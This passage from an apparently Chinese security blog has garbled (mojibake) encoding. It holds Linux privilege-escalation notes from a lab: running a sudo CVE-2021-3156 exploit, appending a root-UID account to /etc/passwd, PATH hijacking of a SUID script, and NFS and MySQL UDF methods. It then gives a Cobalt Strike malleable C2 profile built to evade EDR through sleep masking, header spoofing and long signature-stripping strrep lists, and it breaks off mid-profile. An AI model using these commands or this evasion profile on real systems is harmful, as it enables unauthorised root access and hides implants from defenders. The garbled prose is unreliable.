<h4 id="0x0a-sudoå †ç¼“å†²åŒºæº¢å‡ºææƒ"><a href="#0x0a-sudoå †ç¼“å†²åŒºæº¢å‡ºææƒ" class="headerlink" title="0x0a sudoå †ç¼“å†²åŒºæº¢å‡ºææƒ"></a>0x0a sudoå †ç¼“å†²åŒºæº¢å‡ºææƒ</h4><p>sudo -V </p>
<p><img src="/posts/c474af54/attachment:0b9db52b928c8be4e42773ae56c54197" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/0b9db52b928c8be4e42773ae56c54197.png" alt="æˆªå›¾"></p>
<p>è¯¥ç‰ˆæœ¬å­˜åœ¨sudo å †ç¼“å†²åŒºæº¢å‡ºæ¼æ´</p>
<p>å½±å“ç‰ˆæœ¬åœ¨ </p>
<ul>
<li>Sudo 1.8.2 - 1.8.31p2</li>
<li>Sudo 1.9.0 - 1.9.5p1</li>
</ul>
<p>POC : <a href="https://github.com/Rvn0xsy/CVE-2021-3156-plus">https://github.com/Rvn0xsy/CVE-2021-3156-plus</a> </p>
<p>é€šè¿‡å‰é¢nfsæŒ‚è½½ ç›´æ¥åœ¨kaliä¸‹ä¸‹è½½poc æ‹·è´åˆ°user5ç›®å½•ä¸‹ makeç¼–è¯‘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/expolit &quot;id&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/c474af54/attachment:2880a7402f7c4210518eb33e87c2c1c4" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/2880a7402f7c4210518eb33e87c2c1c4.png" alt="æˆªå›¾"></p>
<h4 id="0x0b-rootç”¨æˆ·ç»„ææƒ-â€”-å†™å…¥-etc-passwd"><a href="#0x0b-rootç”¨æˆ·ç»„ææƒ-â€”-å†™å…¥-etc-passwd" class="headerlink" title="0x0b rootç”¨æˆ·ç»„ææƒ  â€” å†™å…¥/etc/passwd"></a>0x0b rootç”¨æˆ·ç»„ææƒ  â€” å†™å…¥/etc/passwd</h4><p><code>cat /etc/group </code> æŸ¥çœ‹ç”¨æˆ·ç»„</p>
<p><img src="/posts/c474af54/attachment:914fe068e9208e26fbaf1fb37c59d12e" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/914fe068e9208e26fbaf1fb37c59d12e.png" alt="æˆªå›¾"></p>
<p>ç”¨æˆ·user4 user7 å¯ä»¥ä¿®æ”¹ /etc/passwd å†™å…¥æ–°å»ºç”¨æˆ·</p>
<p>åœ¨kaliä¸‹åˆ©ç”¨openssl </p>
<p><img src="/posts/c474af54/attachment:bd93e89c27d81a9bddee7d519689fbe1" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/bd93e89c27d81a9bddee7d519689fbe1.png" alt="æˆªå›¾"></p>
<p>openssl passwd -1 -salt test test</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$1$test$pi/xDtU5WFVRqYS6BMU8X/</span><br><span class="line">echo &#x27;test:$1$test$pi/xDtU5WFVRqYS6BMU8X/:0:0:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/posts/c474af54/attachment:c196a2bbdcaeb87acdf306ad8f49017c" alt="æˆªå›¾"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/c196a2bbdcaeb87acdf306ad8f49017c.png" alt="æˆªå›¾"></p>
<h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><h4 id="1-å†…æ ¸æ¼æ´ææƒ"><a href="#1-å†…æ ¸æ¼æ´ææƒ" class="headerlink" title="1.å†…æ ¸æ¼æ´ææƒ"></a>1.å†…æ ¸æ¼æ´ææƒ</h4><p>æ ¹æ®å†…æ ¸ç‰ˆæœ¬æ‰¾å¯¹åº”ç‰ˆæœ¬çš„æ¼æ´è¿›è¡Œææƒ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æŸ¥çœ‹ç³»ç»Ÿå‘è¡Œç‰ˆæœ¬</span><br><span class="line">lsb_release -a  </span><br><span class="line"># æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬</span><br><span class="line">uname -a </span><br></pre></td></tr></table></figure>

<h4 id="2-SUIDææƒ"><a href="#2-SUIDææƒ" class="headerlink" title="2.SUIDææƒ"></a>2.SUIDææƒ</h4><p>SUIDå¯ä»¥è®©ç¨‹åºè°ƒç”¨è€…ä»¥æ–‡ä»¶æ‰€æœ‰è€…èº«ä»½è¿è¡Œè¯¥æ–‡ä»¶ï¼Œå½“æˆ‘ä»¬ä»¥æ™®é€šç”¨æˆ·å»è¿è¡Œä¸€ä¸ªrootç”¨æˆ·æ‰€æœ‰çš„SUIDæ–‡ä»¶ï¼Œé‚£ä¹ˆè¿è¡Œè¯¥æ–‡ä»¶åå°±å¯ä»¥è·å–åˆ°rootæƒé™ã€‚</p>
<p>æŸ¥æ‰¾å…·æœ‰sæƒé™çš„æ–‡ä»¶</p>
<p>find / -perm -u=s -type f 2&gt;/dev/null </p>
<h4 id="3-sudoææƒ"><a href="#3-sudoææƒ" class="headerlink" title="3.sudoææƒ"></a>3.sudoææƒ</h4><p>æ™®é€šç”¨æˆ·åœ¨ä½¿ç”¨sudoæ‰§è¡Œå‘½ä»¤æ—¶ï¼Œå°†ä¼šä»¥rootæ–¹å¼æ‰§è¡Œå‘½ä»¤ã€‚åœ¨å¾ˆå¤šåœºæ™¯ä¸‹é€šè¿‡é…ç½®sudoeræ–‡ä»¶å¯å®ç°å…å¯†ä»¥rootæƒé™è¿è¡Œã€‚é€šè¿‡sudo -l æŸ¥æ‰¾ç”¨æˆ·ä¸‹é«˜æƒé™ç¬¬ä¸‰æ–¹åº”ç”¨ï¼Œå¯å€ŸåŠ©<a href="https://gtfobins.github.io/">GTFOBins</a>è¿›è¡Œææƒã€‚</p>
<h4 id="4-è®¡åˆ’ä»»åŠ¡ææƒ"><a href="#4-è®¡åˆ’ä»»åŠ¡ææƒ" class="headerlink" title="4.è®¡åˆ’ä»»åŠ¡ææƒ"></a>4.è®¡åˆ’ä»»åŠ¡ææƒ</h4><p>ç³»ç»Ÿä¸­å¯èƒ½ä¼šæœ‰ä¸€äº›å®šæ—¶æ‰§è¡Œçš„ä»»åŠ¡ï¼Œè¿™äº›ä»»åŠ¡éƒ½ç”±crontabç®¡ç†ï¼Œå¯é€šè¿‡<code>cat /etc/crontab</code>æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ï¼Œæ£€æŸ¥æ˜¯å¦å­˜åœ¨å¯ä»¥åˆ©ç”¨çš„æ–‡ä»¶ï¼Œå…¶æœ¬è´¨å°±æ˜¯æ–‡ä»¶æƒé™é…ç½®ä¸å½“ã€‚</p>
<h4 id="5-ç¯å¢ƒå˜é‡ææƒ"><a href="#5-ç¯å¢ƒå˜é‡ææƒ" class="headerlink" title="5. ç¯å¢ƒå˜é‡ææƒ"></a>5. ç¯å¢ƒå˜é‡ææƒ</h4><p>å½“åœ¨ç›®æ ‡æœºå™¨æŸ¥åˆ°å…·æœ‰SUIDæƒé™çš„ç¼–è¯‘æ–‡ä»¶ï¼Œåˆ™å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•è·å–ç®¡ç†å‘˜æƒé™</p>
<ul>
<li>1.echoå‘½ä»¤æ³•</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; ls</span><br><span class="line">chmod 777 ls</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/user5/</span><br><span class="line">./script</span><br></pre></td></tr></table></figure>

<ul>
<li>2.cp æ³•</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/user5/</span><br><span class="line">cp /bin/sh /tmp/ls</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">./script</span><br></pre></td></tr></table></figure>

<ul>
<li>3.è½¯è¿æ¥æ³•(åœ¨æ­¤é¶åœºä¸­æ— æ³•åˆ©ç”¨)</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /bin/sh /tmp/ls</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/user5/</span><br><span class="line">./script</span><br></pre></td></tr></table></figure>

<h4 id="6-ç¬¬ä¸‰æ–¹æœåŠ¡ææƒ"><a href="#6-ç¬¬ä¸‰æ–¹æœåŠ¡ææƒ" class="headerlink" title="6.ç¬¬ä¸‰æ–¹æœåŠ¡ææƒ"></a>6.ç¬¬ä¸‰æ–¹æœåŠ¡ææƒ</h4><h5 id="6-1-NFSææƒ"><a href="#6-1-NFSææƒ" class="headerlink" title="6.1 NFSææƒ"></a>6.1 NFSææƒ</h5><p>å½“æœåŠ¡å™¨ä¸­å­˜åœ¨nfså…±äº«ï¼Œä¸”å¼€å¯äº†<strong><strong>no_root_squash</strong></strong>æ—¶[å¯é€šè¿‡ cat /etc/exportsæŸ¥çœ‹]ï¼Œå¦‚æœå®¢æˆ·ç«¯ä½¿ç”¨çš„æ˜¯rootç”¨æˆ·ï¼Œé‚£ä¹ˆå¯¹äºå…±äº«ç›®å½•æ¥è¯´å°±æœ‰rootæƒé™ï¼Œä»¥æ­¤æå‡æƒé™ã€‚</p>
<ul>
<li>1.æŸ¥çœ‹NFSæœåŠ¡å™¨å…±äº«ç›®å½•</li>
<li>2.åˆ›å»ºæœ¬åœ°æŒ‚è½½ç›®å½• æŒ‚è½½å…±äº«ç›®å½•ï¼Œåˆ©ç”¨æ”»å‡»è€…æœ¬åœ°rootæƒé™åˆ›å»ºsuid shell</li>
<li>3.åœ¨æœåŠ¡å™¨ä¸­ä»¥æ™®é€šç”¨æˆ·è¿è¡Œshell -p  ä»¥è·å–rootæƒé™</li>
</ul>
<h5 id="6-2-æ•°æ®åº“ææƒ"><a href="#6-2-æ•°æ®åº“ææƒ" class="headerlink" title="6.2 æ•°æ®åº“ææƒ"></a>6.2 æ•°æ®åº“ææƒ</h5><p>Mysqlæ•°æ®åº“ææƒæœ‰UDFææƒã€MOFææƒã€å†™å…¥å¯åŠ¨é¡¹ç­‰æ–¹å¼æ¥ææƒï¼Œè¾ƒä¸ºå¸¸è§æ˜¯åˆ™æ˜¯UDFææƒï¼Œå…·ä½“æ­¥éª¤å¯åˆ†å¦‚ä¸‹å‡ æ­¥ï¼š</p>
<ul>
<li>1.è¿æ¥æ•°æ®åº“</li>
<li>2.åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°</li>
<li>3.è®¾ç½®è‡ªå®šä¹‰å‡½æ•°æƒé™</li>
<li>4.æ‰§è¡Œè‡ªå®šä¹‰å‡½æ•°ä»¥è·å–rootæƒé™</li>
</ul>
<p>### References</p>
<p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
<p><a href="https://github.com/wwl012345/Vuln-List/blob/main/Windows%26Linux%E6%8F%90%E6%9D%83%26RCE%E5%90%88%E9%9B%86.md#Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E">https://github.com/wwl012345/Vuln-List/blob/main/Windows%26Linux%E6%8F%90%E6%9D%83%26RCE%E5%90%88%E9%9B%86.md#Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E</a></p>
]]></content>
  </entry>
  <entry>
    <title>CS_Profileé…ç½®</title>
    <url>/posts/ee84a496/</url>
    <content><![CDATA[<p>å‚è€ƒ <a href="https://whiteknightlabs.com/2023/05/23/unleashing-the-unseen-harnessing-the-power-of-cobalt-strike-profiles-for-edr-evasion/">https://whiteknightlabs.com/2023/05/23/unleashing-the-unseen-harnessing-the-power-of-cobalt-strike-profiles-for-edr-evasion/</a></p>
<p>test.profile</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> sample_name <span class="string">&quot;666&quot;</span>; # è®¾ç½®é…ç½®æ–‡ä»¶åç§°</span><br><span class="line"><span class="built_in">set</span> host_stage <span class="string">&quot;true&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> sleeptime <span class="string">&quot;5987&quot;</span>; # ç¡çœ æ—¶é—´ å•ä½ä¸ºæ¯«ç§’ CSé»˜è®¤ä¸º<span class="number">60000</span>ms</span><br><span class="line"><span class="built_in">set</span> jitter    <span class="string">&quot;50&quot;</span>;   # æŠ–åŠ¨é¢‘ç‡ é»˜è®¤<span class="number">0</span></span><br><span class="line"><span class="built_in">set</span> useragent <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.34 Safari/537.36 Edg/81.0.416.20&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> data_jitter <span class="string">&quot;53&quot;</span>; # è®¾ç½®æ•°æ®æŠ–åŠ¨å¤§å°</span><br><span class="line"><span class="built_in">set</span> smb_frame_header <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> pipename <span class="string">&quot;plugplay+####&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> pipename_stager <span class="string">&quot;srvsvc-1-5-5-0####&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> tcp_frame_header <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> ssh_banner <span class="string">&quot;Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-1029-aws x86_64)&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> ssh_pipename <span class="string">&quot;atsvc-####&quot;</span>;</span><br><span class="line"></span><br><span class="line"># åˆ†é˜¶æ®µstageé…ç½®</span><br><span class="line">stage &#123;</span><br><span class="line">    <span class="built_in">set</span> obfuscate <span class="string">&quot;true&quot;</span>;   #æ··æ·†IAT</span><br><span class="line">    <span class="built_in">set</span> stomppe <span class="string">&quot;true&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> cleanup <span class="string">&quot;true&quot;</span>;     #é‡Šæ”¾ä¸å¿…è¦çš„å†…å­˜</span><br><span class="line">    <span class="built_in">set</span> userwx <span class="string">&quot;true&quot;</span>;      #è§„é¿rwxæƒé™çš„å†…å­˜åˆ†é…</span><br><span class="line">    <span class="built_in">set</span> smartinject <span class="string">&quot;true&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    #TCP and SMB beacons will obfuscate themselves <span class="keyword">while</span> they wait <span class="keyword">for</span> a new connection.</span><br><span class="line">    #They will also obfuscate themselves <span class="keyword">while</span> they wait to read information from their parent Beacon.</span><br><span class="line">    <span class="built_in">set</span> sleep_mask <span class="string">&quot;true&quot;</span>;  #å†…å­˜æ··æ·†</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">set</span> allocator <span class="string">&quot;VirtualAlloc&quot;</span>;</span><br><span class="line"></span><br><span class="line">    # Override the first <span class="title function_">bytes</span> <span class="params">(MZ header included)</span> of Beacon&#x27;s Reflective DLL. </span><br><span class="line">    # Valid x86 instructions are required. </span><br><span class="line">    # Follow instructions that change CPU state with instructions that undo the change.</span><br><span class="line">    <span class="meta"># set magic_mz_x86 <span class="string">&quot;OOPS&quot;</span>;</span></span><br><span class="line">    <span class="meta"># set magic_mz_x64 <span class="string">&quot;OOPS&quot;</span>;</span></span><br><span class="line">    <span class="built_in">set</span> magic_pe &quot;LE&quot;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set</span> checksum       <span class="string">&quot;0&quot;</span>;</span><br><span class="line">    <span class="meta">#set compile_time   <span class="string">&quot;19 Apr 2070 21:37:24&quot;</span>;</span></span><br><span class="line">    <span class="built_in">set</span> entry_point    <span class="string">&quot;13760&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> image_size_x86 <span class="string">&quot;548864&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> image_size_x64 <span class="string">&quot;548864&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> name           <span class="string">&quot;wwanapi.dll&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> rich_header    <span class="string">&quot;\x39\x39\x83\xe8\x7d\x58\xed\xbb\x7d\x58\xed\xbb\x7d\x58\xed\xbb\x74\x20\x7e\xbb\x3b\x58\xed\xbb\x26\x30\xee\xba\x7e\x58\xed\xbb\x26\x30\xe9\xba\x69\x58\xed\xbb\x7d\x58\xec\xbb\xbf\x58\xed\xbb\x26\x30\xec\xba\x78\x58\xed\xbb\x26\x30\xe8\xba\x71\x58\xed\xbb\x26\x30\xed\xba\x7c\x58\xed\xbb\x26\x30\xe3\xba\x1f\x58\xed\xbb\x26\x30\x12\xbb\x7c\x58\xed\xbb\x26\x30\xef\xba\x7c\x58\xed\xbb\x52\x69\x63\x68\x7d\x58\xed\xbb\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span>;</span><br><span class="line">         </span><br><span class="line">    </span><br><span class="line">    transform-x86 &#123;</span><br><span class="line">    	#åœ¨Beacon Reflective DLLä¹‹å‰æ’å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œé˜²æ­¢é€šè¿‡dllå‰å‡ ä¸ªå­—èŠ‚æ¥æ£€æµ‹    </span><br><span class="line">        prepend <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>; # NOP, NOP!</span><br><span class="line">        strrep <span class="string">&quot;ReflectiveLoader&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;This program cannot be run in DOS mode&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;NtQueueApcThread&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;IsWow64Process&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;HTTP/1.1 200 OK&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Stack memory was corrupted&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;kernel32&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;beacon.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;KERNEL32.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;ADVAPI32.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;WININET.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;WS2_32.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;DNSAPI.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Secur32.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;VirtualProtectEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;VirtualProtect&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;VirtualAllocEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;VirtualAlloc&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;VirtualFree&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;VirtualQuery&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;RtlVirtualUnwind&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;sAlloc&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;FlsFree&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;FlsGetValue&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;FlsSetValue&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;InitializeCriticalSectionEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;CreateSemaphoreExW&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;SetThreadStackGuarantee&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;CreateThreadpoolTimer&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;SetThreadpoolTimer&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;WaitForThreadpoolTimerCallbacks&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;CloseThreadpoolTimer&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;CreateThreadpoolWait&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;SetThreadpoolWait&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;CloseThreadpoolWait&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;FlushProcessWriteBuffers&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;FreeLibraryWhenCallbackReturns&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetCurrentProcessorNumber&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetLogicalProcessorInformation&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;CreateSymbolicLinkW&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;SetDefaultDllDirectories&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;EnumSystemLocalesEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;CompareStringEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetDateFormatEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetLocaleInfoEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetTimeFormatEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetUserDefaultLocaleName&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;IsValidLocaleName&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;LCMapStringEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetCurrentPackageId&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;UNICODE&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;UTF-8&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;UTF-16LE&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;MessageBoxW&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetActiveWindow&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetLastActivePopup&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetUserObjectInformationW&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetProcessWindowStation&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Sunday&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Monday&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Tuesday&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Wednesday&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Thursday&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Friday&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Saturday&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;January&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;February&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;March&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;April&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;June&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;July&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;August&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;September&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;October&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;November&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;December&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;MM/dd/yy&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Stack memory around _alloca was corrupted&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Unknown Runtime Check Error&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Unknown Filename&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Unknown Module Name&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Run-Time Check Failure #%d - %s&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Stack corrupted near unknown variable&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Stack pointer corruption&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Cast to smaller type causing loss of data&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Stack memory corruption&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Local variable used before initialization&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Stack around _alloca corrupted&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;RegOpenKeyExW&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;egQueryValueExW&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;RegCloseKey&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;LibTomMath&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Wow64DisableWow64FsRedirection&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Wow64RevertWow64FsRedirection&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Kerberos&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        append <span class="string">&quot;\x90\x90\x90&quot;</span>; # NOP, NOP!</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    transform-x64 &#123;</span><br><span class="line">        #åœ¨Beacon Reflective DLLä¹‹å‰æ’å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œé˜²æ­¢é€šè¿‡dllå‰å‡ ä¸ªå­—èŠ‚æ¥æ£€æµ‹</span><br><span class="line">        prepend <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>; # NOP, NOP!</span><br><span class="line">        prepend <span class="string">&quot;\x44\x40\x4B\x43\x4C\x48\x90\x66\x90\x0F\x1F\x00\x66\x0F\x1F\x04\x00\x0F\x1F\x04\x00\x0F\x1F\x00\x0F\x1F\x00&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;ReflectiveLoader&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;This program cannot be run in DOS mode&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;beacon.x64.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;NtQueueApcThread&quot;</span> <span 